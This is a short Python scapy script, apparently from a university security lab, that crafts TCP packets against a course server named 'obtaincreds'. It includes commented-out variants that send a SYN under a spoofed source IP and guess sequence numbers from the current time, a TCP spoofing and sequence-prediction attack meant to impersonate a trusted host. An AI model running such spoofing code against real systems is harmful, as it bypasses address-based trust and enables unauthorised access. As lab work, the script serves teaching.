from scapy.all import *
import time
import pdb

# original syn packet:
IP_pkt = IP(src="10.0.1.20",dst="obtaincreds.cse545.rev.fish")
TCP_pkt_syn = TCP(sport=1234,dport=13337,flags="S")
data = "10.0.1.20"

#Spoofed syn packet:
IP_pkt_spoofed = IP(src="10.2.4.10",dst="obtaincreds.cse545.rev.fish")

#send SYN request to server:
res = sr1(IP_pkt/TCP_pkt_syn)
#res = sr1(IP_pkt_spoofed/TCP_pkt_syn)
#send(IP_pkt_spoofed/TCP_pkt_syn)
#send(IP_pkt/TCP_pkt_syn)

#print syn and ack:
seq1 = res.seq
print seq1
print int(time.time())
#print res.ack

#send ACK to server:
ACK_pkt = TCP(sport=1234, dport=13337, flags='A', seq=res.ack, ack=seq1 + 1)
#ACK_pkt = TCP(sport=1234, dport=13337, flags='A', seq=0, ack=0)
#ACK_pkt = TCP(sport=1234, dport=13337, flags='A', seq=1, ack=int(time.time()) + 1)

# ACK Send && response
#res = sr1(IP_pkt/ACK_pkt/raw(data))
#pdb.set_trace()
#print res.ack
send(IP_pkt/ACK_pkt/raw(data))
#seq1 = res.seq
#ACK_pkt = TCP(sport=1234, dport=13337, flags='A', seq=res.ack, ack=seq1 + 1)
#send(IP_pkt/ACK_pkt)
